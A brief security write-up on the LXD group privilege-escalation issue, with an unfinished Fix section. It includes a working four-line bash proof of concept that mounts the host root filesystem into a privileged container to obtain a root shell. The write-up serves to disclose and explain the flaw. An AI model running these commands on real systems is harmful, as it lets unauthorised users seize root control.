# LXD Group

## Issue
Any user in the lxd group can elevate to root by creating a priviledged container and mounting the root file system inside the container.

Every user in the lxd group needs to be trusted. However this is a flawed security model, as even if the user is trustworth every single piece of code they run may not be and any application ran by that user has the ability to elevate itself to root without permission. 

## Example
POC modified from exploit-db script https://www.exploit-db.com/exploits/46978
```bash
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc chroot /mnt/root /bin/bash
```

## Fix
TODO: Add solutions

## Resources
https://www.exploit-db.com/exploits/46978
